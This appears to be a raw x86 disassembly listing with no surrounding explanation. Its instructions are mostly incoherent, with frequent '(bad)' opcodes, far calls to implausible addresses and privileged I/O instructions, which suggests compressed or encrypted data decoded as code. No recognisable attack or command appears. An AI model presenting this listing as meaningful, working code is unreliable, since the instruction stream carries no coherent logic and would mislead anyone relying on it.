  43048a:	mov    edx,DWORD PTR [edi-0x48]
  43048d:	add    ebx,0xffffffe4
  430490:	test   bp,cx
  430493:	je     0x4304c0
  430495:	mov    eax,DWORD PTR [ebx]
  430497:	cld    
  430498:	sar    BYTE PTR [eax+0x3b0145],1
  43049e:	pcmpeqw mm4,mm6
  4304a1:	xor    edi,edi
  4304a3:	lea    ecx,[ebx-0x239e7470]
  4304a9:	add    BYTE PTR [ebp+0x50],cl
  4304ac:	cmp    eax,DWORD PTR [ebp+0x75]
  4304af:	mov    ebp,DWORD PTR [eax-0x68]
  4304b2:	test   DWORD PTR [eax],eax
  4304b4:	clc    
  4304b5:	push   DWORD PTR [ebp-0x1]
  4304b8:	lea    ecx,[eax]
  4304ba:	int3   
  4304bb:	inc    ebp
  4304bc:	call   0xfb354c
  4304c1:	jne    0x4304bb
  4304c3:	xor    edi,DWORD PTR [ebp-0x41]
  4304c6:	jmp    0x43053a
  4304c8:	mov    eax,DWORD PTR [eax]
  4304ca:	mov    eax,0x339545c7
  4304cf:	inc    DWORD PTR [ebx]
  4304d1:	push   DWORD PTR [ecx]
  4304d3:	xor    eax,0x50eb008b
  4304d8:	mov    eax,DWORD PTR [ebp-0x3c]
  4304db:	mov    eax,eax
  4304dd:	cld    
  4304de:	clc    
  4304df:	ret    
  4304e0:	test   bh,al
  4304e2:	pop    es
  4304e3:	xchg   ebp,eax
  4304e4:	add    bh,bh
  4304e6:	inc    ebp
  4304e7:	dec    DWORD PTR [edi]
  4304e9:	pop    ds
  4304ea:	sub    eax,DWORD PTR [eax]
  4304ec:	add    BYTE PTR [eax+0x76],dl
  4304ef:	push   ebp
  4304f0:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4304f6:	or     al,0xcf
  4304f8:	inc    eax
  4304f9:	enter  0x745,0x72
  4304fd:	inc    ebp
  4304fe:	mov    eax,DWORD PTR [ecx]
  430500:	int3   
  430501:	add    BYTE PTR [ebp-0x75],al
  430504:	xor    eax,0xc74d9cb8
  430509:	xor    edx,eax
  43050b:	lea    eax,[ebp+0x4572f808]
  430511:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430517:	fadd   st,st(6)
  430519:	rol    BYTE PTR [ebp+0x12],0x8b
  43051d:	inc    ebp
  43051e:	fmul   QWORD PTR [ebx-0x3c39233d]
  430524:	inc    ebp
  430525:	test   bh,al
  430527:	call   0xdcf8:0x898532f8
  43052e:	inc    ebp
  43052f:	inc    ebp
  430530:	cmp    esi,DWORD PTR [ebx]
  430532:	pushf  
  430533:	mov    ecx,0xffb48dc7
  430538:	test   eax,ecx
  43053a:	clc    
  43053b:	dec    ebp
  43053c:	inc    ebp
  43053d:	mov    edi,DWORD PTR [ecx]
  43053f:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  430546:	test   edi,edi
  430548:	clc    
  430549:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  430550:	(bad)  
  430551:	enter  0x18e8,0x85
  430555:	xor    eax,0xff459cf8
  43055a:	mov    edi,esp
  43055c:	lock inc ebp
  43055e:	ret    
  43055f:	push   eax
  430560:	(bad)  
  430561:	idiv   BYTE PTR [ebp+0x0]
  430564:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  43056a:	add    BYTE PTR [ebx],dl
  43056c:	jmp    0xce06be
  430571:	les    eax,FWORD PTR [ebp-0x35]
  430574:	mov    ecx,esi
  430576:	lock or al,cl
  430579:	clc    
  43057a:	inc    ebp
  43057b:	add    esi,DWORD PTR [ebx]
  43057d:	jge    0x430582
  43057f:	xor    edi,DWORD PTR [ebx]
  430581:	cmp    ecx,DWORD PTR [edi]
  430583:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430588:	mov    edi,DWORD PTR [ecx]
  43058a:	test   al,0xcc
  43058c:	dec    ebp
  43058d:	test   BYTE PTR [ebx],dh
  43058f:	pop    es
  430590:	xor    eax,DWORD PTR [eax]
  430592:	add    ecx,DWORD PTR [esi]
  430594:	add    ecx,eax
  430596:	psraw  mm0,mm1
  430599:	sub    BYTE PTR [ebp+0x38],cl
  43059c:	mov    edi,DWORD PTR [ebx]
  43059e:	lock int3 
  4305a0:	shl    edx,1
  4305a2:	rol    BYTE PTR [ebp+0xc],1
  4305a5:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305ac:	jmp    0x7705f6
  4305b1:	pushf  
  4305b2:	inc    ebp
  4305b3:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305b9:	xor    ecx,ebx
  4305bb:	add    ecx,esi
  4305bd:	mov    esi,eax
  4305bf:	enter  0x45af,0x8b
  4305c3:	xor    ecx,eax
  4305c5:	add    edx,DWORD PTR [ebp-0x77]
  4305c8:	sub    ecx,DWORD PTR [eax]
  4305ca:	cmp    eax,DWORD PTR [ebp+0x77]
  4305cd:	aad    0x8b
  4305cf:	pushf  
  4305d0:	test   al,0xc7
  4305d2:	mov    DWORD PTR [eax-0x7747b00],ebp
  4305d8:	lods   al,BYTE PTR ds:[esi]
  4305d9:	inc    ebp
  4305da:	dec    ebp
  4305db:	cmp    dh,BYTE PTR [ebx]
  4305dd:	pushf  
  4305de:	xor    eax,edi
  4305e0:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4305e7:	inc    ebp
  4305e8:	dec    ebp
  4305e9:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  4305ef:	mov    esp,0xf80585d0
  4305f4:	inc    ebp
  4305f5:	inc    ebp
  4305f6:	jmp    0x430636
  4305f8:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4305ff:	dec    ebp
  430600:	xor    esi,DWORD PTR [ebx]
  430602:	add    eax,DWORD PTR [ebx]
  430604:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43060a:	dec    ebp
  43060b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430611:	out    dx,eax
  430612:	rol    BYTE PTR [eax],1
  430614:	add    eax,0xebc8458b
  430619:	dec    ebp
  43061a:	mov    ebp,DWORD PTR [ebx]
  43061c:	mov    esp,0x33f84d8b
  430621:	ret    
  430622:	xor    eax,esi
  430624:	add    ecx,eax
  430626:	add    eax,DWORD PTR [edx+0xc1010f]
  43062c:	dec    ebp
  43062d:	inc    ebp
  43062e:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430634:	ror    bl,1
  430636:	add    eax,0xebc645ce
  43063b:	scas   eax,DWORD PTR es:[edi]
  43063c:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430642:	xor    ebp,DWORD PTR [ebx]
  430644:	xor    edi,DWORD PTR [ebx]
  430646:	add    esi,DWORD PTR [edi+0x3]
  430649:	mov    ecx,DWORD PTR [edi]
  43064b:	clc    
  43064c:	rol    ebx,0x4d
  43064f:	(bad)  
  430650:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  430657:	mov    ah,0x45
  430659:	dec    ebp
  43065a:	jbe    0x43068f
  43065c:	mov    esi,DWORD PTR [ebx]
  43065e:	call   0x33465366
  430663:	rdpmc  
  430665:	rol    DWORD PTR [ebx],0x4d
  430668:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43066e:	inc    ebp
  43066f:	ror    BYTE PTR [ebx+0x45450808],1
  430675:	jmp    0x10b0705
  43067a:	inc    ebp
  43067b:	inc    ebp
  43067c:	(bad)  
  43067d:	mov    ebx,eax
  43067f:	clc    
  430680:	test   ebx,eax
  430682:	clc    
  430683:	retf   
  430684:	inc    ebp
  430685:	into   
  430686:	mov    esi,0x8b85afec
  43068c:	clc    
  43068d:	enter  0x5545,0x3b
  430691:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430698:	ret    
  430699:	mov    ah,0xc6
  43069b:	addr16 push 0x338b4545
  4306a1:	clc    
  4306a2:	add    eax,ebx
  4306a4:	loopne 0x430671
  4306a6:	dec    ebp
  4306a7:	into   
  4306a8:	mov    al,dh
  4306aa:	or     BYTE PTR [edi-0x37ff748e],ch
  4306b0:	inc    ebp
  4306b1:	push   ebp
  4306b2:	mov    ebp,DWORD PTR [ebx]
  4306b4:	in     al,dx
  4306b5:	cmp    eax,ebx
  4306b7:	ja     0x4306fe
  4306b9:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4306bf:	inc    ebp
  4306c0:	call   0xd7c3:0x88f8328b
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    eax,esi
  4306cc:	in     al,dx
  4306cd:	scas   eax,DWORD PTR es:[edi]
  4306ce:	retf   
  4306cf:	mov    ecx,DWORD PTR [ebp-0x38]
  4306d2:	mov    edx,DWORD PTR [ebp-0x24]
  4306d5:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  4306dc:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4306e3:	mov    eax,DWORD PTR [ebx]
  4306e5:	clc    
  4306e6:	loopne 0x4306ab
  4306e8:	push   ebp
  4306e9:	retf   
  4306ea:	mov    dh,al
  4306ec:	adc    esi,ecx
  4306ee:	jb     0x43069f
  4306f0:	add    BYTE PTR [ebx+0x558bc845],cl
  4306f6:	in     al,dx
  4306f7:	sub    eax,ebx
  4306f9:	cmp    ecx,ebx
  4306fb:	mov    eax,esi
  4306fd:	mov    esp,0x45af03ce
  430702:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430708:	mov    eax,ebx
  43070a:	in     al,dx
  43070b:	into   
  43070c:	dec    ebp
  43070d:	(bad)  
  43070e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430714:	rol    DWORD PTR [ebp+0x4d],0x89
  430718:	xor    esp,esp
  43071a:	sub    eax,DWORD PTR [ebp-0x75]
  43071d:	add    ebp,esp
  43071f:	mov    al,0x55
  430721:	inc    ebp
  430722:	xor    esi,DWORD PTR ds:0x890f9c03
  430728:	retf   0x55dc
  43072b:	inc    ebp
  43072c:	xor    esi,DWORD PTR [ebx+ebp*1]
  43072f:	pushf  
  430730:	(bad)  
  430731:	(bad)  
  430732:	adc    eax,eax
  430734:	jb     0x4306bb
  430736:	add    al,bh
  430738:	enter  0x8645,0x33
  43073c:	inc    DWORD PTR [ebx]
  43073e:	(bad)  
  43073f:	jmp    0x430786
  430741:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  430747:	inc    ebp
  430748:	(bad)  
  430749:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43074f:	call   0xb4d:0x88c132cb
  430756:	lea    eax,[ebp+0x8]
  430759:	xor    esi,DWORD PTR [edx+0x3]
  43075c:	add    al,ah
  43075e:	inc    ebp
  43075f:	dec    ebp
  430760:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  430766:	data16 add ch,cl
  430769:	inc    ebp
  43076a:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  430770:	inc    ebp
  430771:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  430777:	push   ebp
  430778:	(bad)  
  430779:	mov    BYTE PTR [edi+0xf723b11],ch
  43077f:	add    ch,ch
  430781:	inc    ebp
  430782:	dec    DWORD PTR [ebx-0x34332775]
  430788:	add    al,0x4d
  43078a:	inc    ebp
  43078b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430791:	call   0xc000:0x8b003201
  430798:	add    BYTE PTR [ebp-0x1],cl
  43079b:	xor    ecx,esp
  43079d:	xor    eax,DWORD PTR [eax]
  43079f:	add    edx,DWORD PTR [eax+0x3]
  4307a2:	mov    DWORD PTR [edi],ecx
  4307a4:	call   0x4288c86a
  4307a9:	mov    DWORD PTR [ebp-0x20],esp
  4307ac:	add    BYTE PTR [ebp+0x7d],al
  4307af:	mov    eax,DWORD PTR [eax]
  4307b1:	in     al,0x15
  4307b3:	ret    
  4307b4:	iret   
  4307b5:	(bad)  
  4307b6:	enter  0x14af,0x8b
  4307ba:	(bad)  
  4307bb:	in     al,dx
  4307bc:	or     bl,cl
  4307be:	adc    cl,al
  4307c0:	push   ebp
  4307c1:	dec    ebp
  4307c2:	inc    eax
  4307c3:	mov    edx,DWORD PTR [ebp-0x20]
  4307c6:	jb     0x430793
  4307c8:	mov    ecx,esi
  4307ca:	cld    
  4307cb:	scas   eax,DWORD PTR es:[edi]
  4307cc:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4307d3:	mov    BYTE PTR [eax],0x8c
  4307d6:	push   0xffffff9a
  4307d8:	push   edi
  4307d9:	xor    dl,BYTE PTR [eax+0x3b]
  4307dc:	mov    ecx,DWORD PTR [edi]
  4307de:	call   0x8c424d41
  4307e3:	mov    eax,eax
  4307e5:	in     al,dx
  4307e6:	jge    0x430835
  4307e8:	mov    DWORD PTR [ebx],esi
  4307ea:	int3   
  4307eb:	add    eax,DWORD PTR [ebp+0xf]
  4307ee:	xor    eax,ecx
  4307f0:	(bad)  
  4307f1:	dec    ebp
  4307f2:	pushf  
  4307f3:	xor    ecx,esp
  4307f5:	add    edi,DWORD PTR [edi]
  4307f7:	mov    eax,DWORD PTR [ebp-0x38]
  4307fa:	aam    0x84
  4307fc:	aam    0x9a
  4307fe:	add    esi,DWORD PTR [edx]
  430800:	jmp    0x43078b
  430802:	mov    cl,al
  430804:	add    eax,0x14330f45
  430809:	mov    ecx,0xff458d80
  43080e:	jmp    0xc99017db
  430813:	mov    edx,ecx
  430815:	rol    BYTE PTR [ebp+0x330155],1
  43081b:	add    ecx,DWORD PTR [ebp+0xf]
  43081e:	xor    eax,edx
  430820:	(bad)  
  430821:	ror    DWORD PTR [eax],0x86
  430824:	jb     0x430823
  430826:	add    bh,bh
  430828:	clc    
  430829:	inc    ebp
  43082a:	jb     0x430896
  43082c:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430832:	xor    eax,0xc7d89c8b
  430837:	add    al,al
  430839:	push   0xf830c3
  43083e:	inc    ebp
  43083f:	jne    0x430876
  430841:	push   0xffffff9c
  430843:	inc    edi
  430845:	adc    al,0xe8
  430847:	inc    ebp
  430848:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43084e:	mov    ecx,DWORD PTR [eax]
  430850:	cld    
  430851:	or     DWORD PTR [ebp-0x34],0x33
  430855:	jbe    0x43085a
  430857:	mov    edx,DWORD PTR [ecx+0x2b]
  43085a:	dec    ebp
  43085b:	mov    cl,BYTE PTR [ebx+0x45d801]
  430861:	mov    BYTE PTR [ebx],dh
  430863:	mov    eax,DWORD PTR [ebx]
  430865:	or     BYTE PTR [ecx+0x3b],dl
  430868:	dec    ebp
  430869:	int3   
  43086a:	xor    ebp,edi
  43086c:	add    eax,DWORD PTR [ebp+0x51]
  43086f:	mov    ecx,DWORD PTR [ebp-0x28]
  430872:	xor    eax,DWORD PTR [eax]
  430874:	add    ebp,DWORD PTR [eax+0x51]
  430877:	adc    BYTE PTR [eax+0x0],0x8b
  43087b:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430881:	inc    ebp
  430882:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430888:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43088e:	dec    ebp
  43088f:	mov    esi,DWORD PTR [ebx]
  430891:	hlt    
  430892:	add    eax,ebx
  430894:	push   ecx
  430895:	inc    ebp
  430896:	dec    ebp
  430897:	aam    0xff
  430899:	aam    0xe4
  43089b:	(bad)  
  43089c:	retf   
  43089d:	mov    al,ds:0xc1ff39ce
  4308a2:	adc    al,0xc6
  4308a4:	inc    ebp
  4308a5:	and    eax,0x9c0f4c85
  4308aa:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308b1:	cmp    BYTE PTR [ebx+0x39],0x0
  4308b5:	mov    dh,0xc7
  4308b7:	cmp    eax,eax
  4308b9:	jne    0x45440105
  4308bf:	mov    edi,DWORD PTR [ebx]
  4308c1:	mov    eax,0x848bcb9c
  4308c6:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  4308cd:	or     BYTE PTR [edi],cl
  4308cf:	(bad)  
  4308d0:	dec    ebp
  4308d1:	inc    edi
  4308d2:	add    bh,0x53
  4308d5:	or     cl,ch
  4308d7:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4308dd:	xchg   BYTE PTR [eax-0x1638ac64],al
  4308e3:	mov    esp,0xf802b588
  4308e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308e9:	inc    ebp
  4308ea:	(bad)  
  4308eb:	cmp    edi,edi
  4308ed:	pushf  
  4308ee:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4308f5:	mov    ecx,DWORD PTR [ebp-0x340018]
  4308fb:	into   
  4308fc:	dec    DWORD PTR [ebx-0x7f72431c]
  430902:	push   0x5000ff01
  430907:	retf   
  430908:	inc    ebp
  430909:	into   
  43090a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430910:	push   eax
  430911:	into   
  430912:	call   0x4b0da2
  430917:	retf   
  430918:	add    dh,cl
  43091a:	add    bh,bh
  43091c:	mov    DWORD PTR [eax+ecx*1],edx
  43091f:	clc    
  430920:	inc    ebp
  430921:	inc    ebp
  430922:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  430928:	push   0x1
  43092a:	push   edi
  43092b:	add    BYTE PTR [eax-0x35],dl
  43092e:	mov    ecx,esi
  430930:	cld    
  430931:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  430937:	into   
  430938:	ror    BYTE PTR [ebx+0x75000800],0x50
  43093f:	xor    eax,DWORD PTR [ebp+0x3]
  430942:	jne    0x430995
  430944:	call   DWORD PTR [eax-0x3c]
  430947:	mov    DWORD PTR [ecx-0x18],edx
  43094a:	mov    edi,edi
  43094c:	call   0x8b464ed5
  430951:	add    ah,ah
  430953:	rol    BYTE PTR [ebp-0x7c],0xeb
  430957:	add    edi,edi
  430959:	add    al,ch
  43095b:	inc    ebp
  43095c:	push   ecx
  43095d:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  430963:	mov    al,0xc7
  430965:	test   esp,esp
  430967:	clc    
  430968:	test   DWORD PTR [ebp-0x8],ecx
  43096b:	add    BYTE PTR [ebp+0x53],0x34
  43096f:	jmp    0x8bcc9210
  430974:	in     al,dx
  430975:	or     BYTE PTR [ebp-0xf],al
  430978:	xor    eax,DWORD PTR [eax+0x4f896603]
  43097e:	hlt    
  43097f:	mov    eax,DWORD PTR [ebp-0x50]
  430982:	xor    esi,ecx
  430984:	add    eax,DWORD PTR [eax+0x4f086689]
  43098a:	inc    ebp
  43098b:	adc    ebp,0x68
  43098e:	pushf  
  43098f:	inc    edi
  430991:	add    al,ch
  430993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430994:	test   edi,edi
  430996:	clc    
  430997:	inc    DWORD PTR [ebp-0x73]
  43099a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43099e:	(bad)  
  43099f:	push   ecx
  4309a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309a1:	jne    0x430928
  4309a3:	push   eax
  4309a4:	clc    
  4309a5:	test   DWORD PTR [ebp-0x1],eax
  4309a8:	cmp    bh,bh
  4309aa:	pushf  
  4309ab:	mov    eax,edi
  4309ad:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4309b4:	inc    ebp
  4309b5:	push   edi
  4309b6:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  4309be:	dec    ebp
  4309bf:	add    BYTE PTR [ebx],dh
  4309c1:	inc    ebp
  4309c2:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4309c8:	enter  0x8401,0x0
  4309cc:	add    al,BYTE PTR [eax]
  4309ce:	add    bh,bh
  4309d0:	out    dx,eax
  4309d1:	sbb    BYTE PTR [eax],al
  4309d3:	dec    ebp
  4309d4:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4309da:	sub    esi,DWORD PTR [ebx]
  4309dc:	mov    ebp,DWORD PTR [eax-0x8]
  4309df:	add    bl,0x0
  4309e2:	(bad)  
  4309e3:	cmp    eax,ecx
  4309e5:	or     BYTE PTR [edx+0x750114],al
  4309eb:	inc    DWORD PTR [ebp+0x18]
  4309ee:	mov    eax,DWORD PTR [ebp-0x8]
  4309f1:	mov    ebx,eax
  4309f3:	(bad)  
  4309f4:	retf   
  4309f5:	inc    ebp
  4309f6:	into   
  4309f7:	mov    esi,eax
  4309f9:	int3   
  4309fa:	scas   eax,DWORD PTR es:[edi]
  4309fb:	push   es
  4309fc:	mov    esi,DWORD PTR [ebp-0xc]
  4309ff:	call   DWORD PTR [ebp+0x18]
  430a02:	sub    edi,DWORD PTR [ebp+0x3b]
  430a05:	mov    esi,DWORD PTR [edi-0x34]
  430a08:	mov    eax,DWORD PTR [ebp-0x8]
  430a0b:	xor    eax,0xc7c69cc3
  430a10:	mov    esp,0x8b8500dc
  430a15:	clc    
  430a16:	mov    esp,0x338b4d45
  430a1b:	in     al,0x33
  430a1d:	ret    
  430a1e:	add    eax,esi
  430a20:	add    eax,DWORD PTR [ebp+0xf]
  430a23:	mov    eax,ecx
  430a25:	in     al,0x4d
  430a27:	ret    
  430a28:	mov    eax,esi
  430a2a:	in     al,dx
  430a2b:	inc    ebp
  430a2c:	rol    edi,1
  430a2e:	sar    al,1
  430a30:	or     BYTE PTR [ebp+0x45e9f845],al
  430a36:	add    BYTE PTR [ebx],bh
  430a38:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a3f:	test   ebx,eax
  430a41:	clc    
  430a42:	retf   
  430a43:	inc    ebp
  430a44:	into   
  430a45:	cmp    esi,eax
  430a47:	pushf  
  430a48:	scas   eax,DWORD PTR es:[edi]
  430a49:	(bad)  
  430a4a:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a51:	inc    ebp
  430a52:	cmp    edi,DWORD PTR [edi]
  430a54:	ja     0x4309f2
  430a56:	mov    eax,edi
  430a58:	mov    esp,0x458567a8
  430a5d:	clc    
  430a5e:	mov    eax,DWORD PTR [ebp-0x8]
  430a61:	mov    eax,ebx
  430a63:	in     al,dx
  430a64:	retf   
  430a65:	ret    
  430a66:	into   
  430a67:	mov    dh,0x7d
  430a6a:	scas   eax,DWORD PTR es:[edi]
  430a6b:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430a71:	add    BYTE PTR [ebx],ch
  430a73:	jmp    0xba0bb3
  430a78:	mov    eax,DWORD PTR [ebp-0x5c]
  430a7b:	mov    eax,DWORD PTR [ebp-0x14]
  430a7e:	inc    ebp
  430a7f:	enter  0x458b,0xf8
  430a83:	xor    eax,ebx
  430a85:	add    ecx,ebx
  430a87:	cmp    ecx,esi
  430a89:	shufps xmm7,xmm4,0xaf
  430a8d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430a93:	dec    ebp
  430a94:	sub    esi,DWORD PTR [ebx]
  430a96:	cmp    esi,DWORD PTR [ebx]
  430a98:	ja     0x430a9d
  430a9a:	mov    eax,DWORD PTR [ebx]
  430a9c:	lods   al,BYTE PTR ds:[esi]
  430a9d:	mov    db0,ecx
  430aa0:	inc    ebp
  430aa1:	dec    ebp
  430aa2:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aa8:	retf   
  430aa9:	rol    dh,1
  430aab:	or     al,0xce
  430aad:	inc    ebp
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	add    BYTE PTR [ebx],bh
  430ab9:	inc    ebp
  430aba:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430ac0:	inc    ebp
  430ac1:	retf   
  430ac2:	mov    ecx,esi
  430ac4:	clc    
  430ac5:	(bad)  
  430ac6:	retf   
  430ac7:	scas   eax,DWORD PTR es:[edi]
  430ac8:	ret    
  430ac9:	mov    ecx,esi
  430acb:	hlt    
  430acc:	(bad)  
  430acd:	push   ebp
  430ace:	scas   eax,DWORD PTR es:[edi]
  430acf:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430ad5:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430adb:	add    BYTE PTR [ebx],al
  430add:	mov    eax,eax
  430adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ae0:	inc    ebp
  430ae1:	dec    ebp
  430ae2:	xor    eax,0x89339c33
  430ae7:	add    edx,eax
  430ae9:	add    eax,DWORD PTR [ebp+0xf]
  430aec:	xor    al,0xc1
  430aee:	pushf  
  430aef:	dec    ebp
  430af0:	(bad)  
  430af1:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430af7:	rol    BYTE PTR [ebp+0x5],1
  430afa:	xor    eax,DWORD PTR [ebp+0x3]
  430afd:	jmp    0x430aea
  430aff:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b05:	xor    eax,DWORD PTR [ebp+0x33]
  430b08:	mov    eax,DWORD PTR [ebx]
  430b0a:	rol    BYTE PTR [ebx],1
  430b0c:	test   BYTE PTR [edi],cl
  430b0e:	call   0xb8b:0x884d32c1
  430b15:	in     al,dx
  430b16:	inc    ebp
  430b17:	shl    DWORD PTR [ebx],1
  430b19:	rol    BYTE PTR [ebx],1
  430b1b:	add    eax,0xeb4d45e0
  430b20:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b26:	add    BYTE PTR [ebx],dh
  430b28:	inc    ebp
  430b29:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b2f:	rdpmc  
  430b31:	rol    DWORD PTR [ebx],0x4d
  430b34:	loopne 0x430ac1
  430b36:	push   ebp
  430b37:	in     al,dx
  430b38:	mov    cl,dl
  430b3a:	adc    eax,edx
  430b3c:	jb     0x430b43
  430b3e:	add    BYTE PTR [ebp+0x45],al
  430b41:	jmp    0x430ace
  430b43:	mov    ebx,eax
  430b45:	test   al,0xcb
  430b47:	dec    ebp
  430b48:	dec    ebp
  430b49:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b4f:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430b55:	dec    ebp
  430b56:	mov    al,0x8b
  430b58:	dec    ebp
  430b59:	in     al,dx
  430b5a:	xor    edx,ecx
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR [ebp+0x3]
  430b61:	jbe    0x430b72
  430b63:	mov    eax,ecx
  430b65:	test   al,0x45
  430b67:	dec    ebp
  430b68:	mov    DWORD PTR [ebx],esi
  430b6a:	loopne 0x430b9f
  430b6c:	inc    ebp
  430b6d:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430b73:	rol    esi,0x45
  430b76:	scas   eax,DWORD PTR es:[edi]
  430b77:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430b7d:	mov    eax,ecx
  430b7f:	hlt    
  430b80:	dec    ebp
  430b81:	inc    ebp
  430b82:	mov    eax,edi
  430b84:	loopne 0x430b5e
  430b86:	retf   
  430b87:	test   esi,ecx
  430b89:	clc    
  430b8a:	scas   eax,DWORD PTR es:[edi]
  430b8b:	inc    ebp
  430b8c:	mov    eax,edi
  430b8e:	fdiv   st,st(0)
  430b90:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430b96:	call   0xf8b:0x3b9c323b
  430b9d:	fcomp  DWORD PTR [esi-0x3d]
  430ba0:	inc    esi
  430ba2:	mov    ebp,DWORD PTR [eax-0x10]
  430ba5:	inc    ebp
  430ba6:	dec    ebp
  430ba7:	xor    esi,DWORD PTR [ebx]
  430ba9:	add    eax,DWORD PTR [ebx]
  430bab:	loopne 0x430bbc
  430bad:	dec    ebp
  430bae:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bb5:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bbb:	lock call 0xf48b:0x894532c3
  430bc3:	rol    BYTE PTR [ebp-0x7c],1
  430bc6:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430bcc:	call   edi
  430bce:	enter  0x4d45,0x8b
  430bd2:	mov    esi,eax
  430bd4:	fmul   st(3),st
  430bd6:	push   ebp
  430bd7:	dec    ebp
  430bd8:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430bde:	ret    0xc19a
  430be1:	xor    al,BYTE PTR [esi-0x280276]
  430be7:	dec    ebp
  430be8:	jne    0x430c1d
  430bea:	mov    eax,DWORD PTR [ebx]
  430bec:	cld    
  430bed:	loopne 0x430b9f
  430bef:	push   ebp
  430bf0:	add    DWORD PTR [eax+0x72851100],ecx
  430bf6:	inc    DWORD PTR [eax]
  430bf8:	inc    DWORD PTR [ebp-0x75]
  430bfb:	mov    edi,esp
  430bfd:	lock add bl,0x1
  430c01:	retf   
  430c02:	add    dh,al
  430c04:	xor    dh,cl
  430c06:	inc    ebp
  430c07:	scas   eax,DWORD PTR es:[edi]
  430c08:	mov    eax,DWORD PTR [ebx]
  430c0a:	shl    al,0x0
  430c0d:	inc    ebp
  430c0e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c14:	call   0x461e4c
  430c19:	ud0    eax,ecx
  430c1c:	adc    al,0x4d
  430c1e:	inc    ebp
  430c1f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c25:	lock push 0x338055
  430c2b:	add    eax,DWORD PTR [eax]
  430c2d:	ud0    ecx,edx
  430c30:	sbb    BYTE PTR [ebp+0x5e],dl
  430c33:	xor    ecx,ecx
  430c35:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c3c:	push   ecx
  430c3d:	add    BYTE PTR [ebp-0x38],cl
  430c40:	mov    DWORD PTR [esi-0x740004],eax
  430c46:	cld    
  430c47:	inc    ebp
  430c48:	xchg   ebx,eax
  430c49:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430c4f:	xabort 0xaf
  430c52:	icebp  
